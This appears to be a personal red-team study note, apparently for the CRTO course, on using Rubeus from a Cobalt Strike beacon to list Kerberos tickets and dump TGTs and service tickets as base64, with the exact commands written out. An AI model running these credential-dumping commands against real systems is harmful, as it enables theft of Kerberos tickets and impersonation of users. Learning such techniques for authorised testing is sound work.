
Tool: [Rubeus](https://github.com/GhostPack/Rubeus)

Uses legitimate Windows APIs, reducing the noise.

- Its `triage` command will list all the Kerberos tickets in your current logon session and if elevated, from all logon sessions on the machine.

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage`

![[kerberos_sessions.png]]

LUID (local unique identifier) is the logon session identifier. 
krbtgt - [[Ticket Granting Ticket (TGT)]] tickets
All others are [[Ticket Granting Service (TGS)]] tickets

- Once listed, you can extract them all or specific tickets from a session

All tickets
`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump`

---
A specific ticket
`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt`

This will output the ticket(s) in base64 encoded format.

  You may also add the `/nowrap` option which will format the base64 encoding onto a single line - this makes copy & pasting much easier.




### ⚠ Opsec




### Properties
---
📆 created   {{18-02-2024}} 19:11
🏷️ tags: #redteam #crto 

---

